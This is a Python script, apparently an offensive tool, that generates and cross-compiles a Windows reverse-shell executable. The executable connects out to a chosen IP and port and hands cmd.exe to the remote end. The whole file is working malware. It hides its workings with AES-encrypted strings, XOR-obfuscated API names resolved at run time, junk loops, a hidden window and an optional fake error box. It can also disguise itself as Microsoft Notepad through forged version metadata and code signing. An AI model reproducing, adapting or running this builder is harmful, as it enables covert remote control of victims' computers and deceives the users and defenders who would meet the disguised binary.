from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import argparse
import subprocess
import os
import shlex
import shutil
import sys

key = b'1GJ7d9gY57Fdjo43'
aes = AES.new(key, AES.MODE_ECB)

def ensure_mingw_installed():
    if not shutil.which("x86_64-w64-mingw32-gcc"):
        print("[*] MinGW-w64 not detected. Installing...")
        try:
            subprocess.run(["sudo", "apt", "update"], check=True)
            subprocess.run(["sudo", "apt", "install", "-y", "mingw-w64"], check=True)
            print("[+] MinGW-w64 successfully installed.")
        except subprocess.CalledProcessError:
            print("[-] Installation failed. Install MinGW-w64 manually.")
            sys.exit(1)
    else:
        print("[+] MinGW-w64 is already installed.")

def encrypt_bytes(text):
    padded = pad(text.encode(), 16)
    encrypted = aes.encrypt(padded)
    return ', '.join(f'0x{b:02X}' for b in encrypted)

def xor_string(s, xor_key=0x55):
    return ''.join(f'\\x{ord(c) ^ xor_key:02x}' for c in s)

def generate_payload_c(ip, cmd, port, fake_meta=False, show_msg=False):
    enc_ip = encrypt_bytes(ip)
    enc_cmd = encrypt_bytes(cmd)

    xor_k = 0x55
    ws2 = xor_string("ws2_32.dll", xor_k)
    k32 = xor_string("kernel32.dll", xor_k)
    wsa1 = xor_string("WSAStartup", xor_k)
    wsa2 = xor_string("WSASocketA", xor_k)
    ctt = xor_string("connect", xor_k)
    cpa = xor_string("CreateProcessA", xor_k)

    win_flags = "CREATE_NO_WINDOW"

    with open("payload.c", "w") as f:
        f.write(f'''
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include "aes.h"
#pragma comment(lib, "ws2_32")

{"#pragma comment(lib, \"user32\")" if show_msg else ""}
__declspec(dllexport) void FakeEntryPoint() {{}}

void __noise1() {{
    int z = 42;
    for (int j = 0; j < 333; j++) {{
        z ^= (z << 2) + j;
    }}
}}

const uint8_t _k[16] = "1GJ7d9gY57Fdjo43";
uint8_t __ip[] = {{ {enc_ip} }};
uint8_t __cmd[] = {{ {enc_cmd} }};

char* _xd(const char* a, char* o, char k) {{
    int i = 0;
    while (a[i]) {{
        o[i] = a[i] ^ k;
        i++;
    }}
    o[i] = 0;
    return o;
}}

FARPROC __r(const char* d, const char* f) {{
    char dx[64], fx[64];
    _xd(d, dx, 0x{xor_k:02x});
    _xd(f, fx, 0x{xor_k:02x});
    HMODULE h = LoadLibraryA(dx);
    return h ? GetProcAddress(h, fx) : NULL;
}}

void __dec(uint8_t* in, char* out) {{
    struct AES_ctx c;
    AES_init_ctx(&c, _k);
    uint8_t tmp[16];
    memcpy(tmp, in, 16);
    AES_ECB_decrypt(&c, tmp);
    memcpy(out, tmp, 16);
    out[15] = '\\0';
}}

int main() {{
    {"MessageBoxA(NULL, \"Fatal Error\", \"Error\", MB_OK | MB_ICONERROR);" if show_msg else ""}
    for (volatile int j = 0; j < 100000000; j++) {{ __noise1(); }}

    char a[16], b[16];
    __dec(__ip, a);
    __dec(__cmd, b);

    typedef int (WINAPI *T1)(WORD, LPWSADATA);
    typedef SOCKET (WINAPI *T2)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
    typedef int (WINAPI *T3)(SOCKET, const struct sockaddr*, int);
    typedef BOOL (WINAPI *T4)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                               BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

    const char dll1[] = "{ws2}";
    const char dll2[] = "{k32}";
    const char fn1[] = "{wsa1}";
    const char fn2[] = "{wsa2}";
    const char fn3[] = "{ctt}";
    const char fn4[] = "{cpa}";

    T1 _f1 = (T1)__r(dll1, fn1);
    T2 _f2 = (T2)__r(dll1, fn2);
    T3 _f3 = (T3)__r(dll1, fn3);
    T4 _f4 = (T4)__r(dll2, fn4);

    if (!_f1 || !_f2 || !_f3 || !_f4) return 1;

    WSADATA w;
    _f1(MAKEWORD(2, 2), &w);

    SOCKET s = _f2(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return 1;

    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = htons({port});
    inet_pton(AF_INET, a, &srv.sin_addr);

    if (_f3(s, (struct sockaddr*)&srv, sizeof(srv)) == SOCKET_ERROR)
        return 1;

    STARTUPINFOA i;
    PROCESS_INFORMATION p;
    ZeroMemory(&i, sizeof(i));
    i.cb = sizeof(i);
    i.dwFlags = STARTF_USESTDHANDLES;
    i.hStdInput = i.hStdOutput = i.hStdError = (HANDLE)s;

    if (!_f4(NULL, b, NULL, NULL, TRUE, {win_flags}, NULL, NULL, &i, &p))
        return 1;

    return 0;
}}
''')
    print("[+] Obfuscated payload.c generated.")

    if fake_meta:
        with open("notepad.rc", "w") as rc:
            rc.write('''
id ICON "notepad.ico"

1 VERSIONINFO
FILEVERSION 10,0,19041,1
PRODUCTVERSION 10,0,19041,1
FILEOS 0x4
FILETYPE 0x1
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904b0"
    BEGIN
      VALUE "CompanyName", "Microsoft Corporation"
      VALUE "FileDescription", "Notepad"
      VALUE "FileVersion", "10.0.19041.1"
      VALUE "InternalName", "notepad.exe"
      VALUE "OriginalFilename", "notepad.exe"
      VALUE "ProductName", "Microsoft® Windows® OS"
      VALUE "ProductVersion", "10.0.19041.1"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x0409, 1200
  END
END
''')
        print("[+] Fake metadata resource file generated.")

def compile_payload(fake_meta=False, keep=False, sign=False):
    out = "notepad.exe" if fake_meta else "payload.exe"
    try:
        cmd = ["x86_64-w64-mingw32-gcc", "payload.c", "aes.c"]
        if fake_meta:
            subprocess.run(["x86_64-w64-mingw32-windres", "notepad.rc", "-O", "coff", "-o", "notepad.res"], check=True)
            cmd.append("notepad.res")
        cmd += ["-o", out, "-lws2_32", "-mwindows"]
        print(f"[*] Compiling: {' '.join(cmd)}")
        subprocess.run(cmd, check=True)
        print(f"[+] Compilation successful: {out}")

        if sign:
            signed = out.replace(".exe", "_signed.exe")
            subprocess.run(shlex.split(f"python sign_exe.py {out} --output {signed}"), check=True)
            print(f"[+] Signed as {signed}")

    finally:
        if not keep:
            for x in ["payload.c", "notepad.rc", "notepad.res"]:
                if os.path.exists(x):
                    os.remove(x)
        else:
            print("[*] Temporary files kept.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Obfuscated AES Payload Generator")
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", type=int, default=49557, help="Port to connect")
    parser.add_argument("--cmd", default="cmd.exe", help="Command to run remotely")
    parser.add_argument("--notepad", action="store_true", help="Fake notepad appearance")
    parser.add_argument("--keep", action="store_true", help="Keep .c and .rc files")
    parser.add_argument("--sign", action="store_true", help="Digitally sign the EXE")
    parser.add_argument("--gui", action="store_true", help="Show GUI error message")

    args = parser.parse_args()
    generate_payload_c(args.ip, args.cmd, args.port, args.notepad, args.gui)
    compile_payload(args.notepad, args.keep, args.sign)
